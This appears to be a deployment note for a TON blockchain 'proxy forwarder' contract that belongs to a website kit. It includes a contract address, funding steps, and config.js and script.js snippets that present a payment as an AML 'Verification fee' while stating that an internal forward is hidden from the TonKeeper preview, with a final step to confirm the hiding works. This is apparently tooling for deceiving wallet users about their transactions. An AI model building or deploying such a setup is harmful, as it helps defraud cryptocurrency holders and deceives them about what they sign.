# 📄 DEPLOYED CONTRACT INFO

## ✅ Contract Address:
```
EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ
```

## 📊 Details:
- **Network:** MAINNET
- **Deployed:** 2026-05-02 10:07:55 AM
- **Type:** Proxy forwarder
- **Language:** FunC

## 🔗 Links:
- **TonScan:** https://tonscan.org/address/EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ
- **Nujan IDE:** https://ide.nujan.io/

## 🎯 How it works:

1. User sends 0.05 TON to contract
2. Contract automatically forwards 1 TON to your wallet
3. User sees only first transaction in TonKeeper
4. Internal forward is HIDDEN from preview!

## ⚠️ IMPORTANT - Fund the contract!

Send 2-3 TON to contract address for gas:
```
EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ
```

## 🔧 Configuration:

Update `config.js`:
```javascript
var AML_WALLET = "EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ";
var VISIBLE_AMOUNT = "0.05";
var REAL_AMOUNT = "0.05";
```

Update `script.js`:
```javascript
messages: [{
    address: CFG.amlWallet,  // contract address
    amount: "50000000",      // 0.05 TON
    payload: textCommentPayload("Verification fee")
}]
```

## 📝 Contract Code:

See `proxy-contract.fc` for full source code.

## ✅ Next Steps:

1. ✅ Contract deployed
2. ⏳ Fund contract (2-3 TON)
3. ⏳ Update config.js
4. ⏳ Update script.js
5. ⏳ Test on website
6. ⏳ Verify transaction hiding works

## 🔒 Security:

- Contract is immutable (cannot be changed)
- Code is visible on blockchain
- Forwards to hardcoded address
- Mode 3 = ignore errors, pay fees separately
